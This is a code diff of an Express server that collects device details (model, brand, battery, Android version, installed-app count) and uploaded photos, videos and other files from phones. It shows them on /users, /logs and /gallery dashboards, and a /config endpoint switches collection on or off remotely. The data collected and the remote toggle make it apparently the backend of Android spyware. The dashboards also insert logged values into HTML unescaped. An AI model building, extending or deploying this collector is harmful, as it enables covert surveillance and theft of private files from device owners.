@@ -8,6 +8,7 @@ const app = express();
 
 const LOG_FILE = "logs.json";
 const UPLOAD_DIR = path.join(__dirname, "uploads");
+const CONFIG_FILE = "config.json";
 
 if (!fs.existsSync(UPLOAD_DIR)) {
   fs.mkdirSync(UPLOAD_DIR);
@@ -19,6 +20,31 @@ function getIP(req) {
   return (req.headers['x-forwarded-for'] || '').split(',')[0]
       || req.socket.remoteAddress
       || "unknown";
+}
+
+function loadConfig() {
+  try {
+    return JSON.parse(fs.readFileSync(CONFIG_FILE, "utf-8"));
+  } catch {
+    return { enabled: false };
+  }
+}
+
+function isAllowed(req, type) {
+  const cfg = loadConfig();
+
+  const ip = getIP(req);
+  const model = req.query.model || "";
+
+  if (!cfg.enabled) return false;
+
+  if (type === "track" && !cfg.send_device_info) return false;
+  if (type === "upload" && !cfg.send_files) return false;
+
+  if (cfg.blocked_ips?.includes(ip)) return false;
+  if (cfg.blocked_models?.includes(model)) return false;
+
+  return true;
 }
 
 function saveLog(data) {
@@ -36,23 +62,23 @@ function parseBody(body) {
     }
   });
 
-  if (obj.apps) {
-    obj.apps = obj.apps.split(",").map(x => x.trim()).filter(Boolean);
-  }
-
   return obj;
 }
 
 /* ================= CONFIG CONTROL ================= */
 
 app.get('/config', (req, res) => {
-  // 0 = OFF, 1 = ON
-  res.send("0");
+  const cfg = loadConfig();
+  res.send(cfg.enabled ? "1" : "0");
 });
 
 /* ================= TRACK ================= */
 
 app.post('/track', (req, res) => {
+
+  if (!isAllowed(req, "track")) {
+    return res.json({ status: "blocked" });
+  }
 
   let body = "";
 
@@ -62,13 +88,18 @@ app.post('/track', (req, res) => {
 
     const parsed = parseBody(body);
 
+    const apps = parsed.apps
+      ? parsed.apps.split(",").map(x => x.trim()).filter(Boolean)
+      : [];
+
     const data = {
+      type: "device",
       ip: getIP(req),
       battery: parsed.battery,
       model: parsed.model,
       brand: parsed.brand,
       android: parsed.android,
-      apps: parsed.apps || [],
+      app_count: apps.length,
       time: new Date().toISOString()
     };
 
@@ -85,8 +116,11 @@ app.post('/track', (req, res) => {
 
 app.post('/upload', (req, res) => {
 
-  let fileName = Date.now().toString();
+  if (!isAllowed(req, "upload")) {
+    return res.status(403).send("blocked");
+  }
 
+  let fileName = Date.now().toString();
   let original = "file.bin";
 
   if (req.query.name) {
@@ -102,7 +136,6 @@ app.post('/upload', (req, res) => {
   const filePath = path.join(UPLOAD_DIR, fileName);
 
   console.log("\n📦 FILE RECEIVED =====================");
-  console.log("Query:", req.query);
   console.log("Saved as:", fileName);
 
   const stream = fs.createWriteStream(filePath);
@@ -114,11 +147,13 @@ app.post('/upload', (req, res) => {
 
   req.on('end', () => {
 
-    saveLog({
+    const data = {
       type: "file",
       file: fileName,
       time: new Date().toISOString()
-    });
+    };
+
+    saveLog(data);
 
     res.json({ status: "uploaded", file: fileName });
   });
@@ -139,9 +174,11 @@ app.get('/users', (req, res) => {
     .filter(Boolean)
     .map(x => JSON.parse(x));
 
+  const devices = logs.filter(x => x.type === "device");
+
   const unique = {};
 
-  logs.forEach(log => {
+  devices.forEach(log => {
     if (!log.ip || !log.model) return;
     const key = log.ip + "_" + log.model;
     unique[key] = log;
@@ -155,8 +192,6 @@ app.get('/users', (req, res) => {
     <style>
       body { background:#111; color:#fff; font-family:sans-serif; }
       .card { border:1px solid #333; padding:15px; margin:10px; border-radius:10px; }
-      .apps { max-height:200px; overflow:auto; background:#000; padding:10px; }
-      .apps div { font-size:12px; border-bottom:1px solid #222; padding:2px; }
     </style>
   </head>
   <body>
@@ -171,13 +206,37 @@ app.get('/users', (req, res) => {
       <b>Device:</b> ${user.brand} ${user.model}<br>
       <b>Android:</b> ${user.android}<br>
       <b>Battery:</b> ${user.battery}<br>
-
-      <h4>Apps (${user.apps?.length || 0})</h4>
-      <div class="apps">
-        ${(user.apps || []).map(a => `<div>${a}</div>`).join("")}
-      </div>
+      <b>Apps Count:</b> ${user.app_count}<br>
     </div>
     `;
+  });
+
+  html += "</body></html>";
+
+  res.send(html);
+});
+
+/* ================= LOG VIEW (ORDER FIX) ================= */
+
+app.get('/logs', (req, res) => {
+
+  if (!fs.existsSync(LOG_FILE)) return res.send("No logs");
+
+  const logs = fs.readFileSync(LOG_FILE, "utf-8")
+    .split("\n")
+    .filter(Boolean)
+    .map(x => JSON.parse(x));
+
+  // device first, then files
+  const ordered = [
+    ...logs.filter(x => x.type === "device"),
+    ...logs.filter(x => x.type === "file")
+  ];
+
+  let html = `<html><body style="background:#111;color:#fff;font-family:sans-serif">`;
+
+  ordered.reverse().forEach(l => {
+    html += `<pre>${JSON.stringify(l, null, 2)}</pre><hr>`;
   });
 
   html += "</body></html>";
@@ -193,56 +252,23 @@ app.get('/gallery', (req, res) => {
 
   let html = `
   <html>
-  <head>
-    <style>
-      body { background:#111; color:#fff; font-family:sans-serif; }
-      .grid { display:flex; flex-wrap:wrap; }
-      .card { margin:10px; }
-      img, video { width:220px; border-radius:10px; display:block; }
-      a { color:#0af; text-decoration:none; }
-      .btn { margin-top:5px; display:inline-block; }
-    </style>
-  </head>
-  <body>
-    <h2>Total Files: ${files.length}</h2>
-    <div class="grid">
+  <body style="background:#111;color:#fff;font-family:sans-serif">
+  <h2>Total Files: ${files.length}</h2>
   `;
 
   files.reverse().forEach(file => {
-
     const url = `/uploads/${file}`;
 
     if (file.endsWith(".jpg") || file.endsWith(".png")) {
-      html += `
-        <div class="card">
-          <img src="${url}" />
-          <a class="btn" href="${url}" download>⬇ Download</a>
-        </div>
-      `;
+      html += `<img src="${url}" width="200"><br>`;
+    } else if (file.endsWith(".mp4")) {
+      html += `<video src="${url}" controls width="200"></video><br>`;
+    } else {
+      html += `<a href="${url}">${file}</a><br>`;
     }
-
-    else if (file.endsWith(".mp4")) {
-      html += `
-        <div class="card">
-          <video controls>
-            <source src="${url}" type="video/mp4">
-          </video>
-          <a class="btn" href="${url}" download>⬇ Download</a>
-        </div>
-      `;
-    }
-
-    else {
-      html += `
-        <div class="card">
-          <a href="${url}" target="_blank">${file}</a>
-        </div>
-      `;
-    }
-
   });
 
-  html += `</div></body></html>`;
+  html += "</body></html>";
 
   res.send(html);
 });
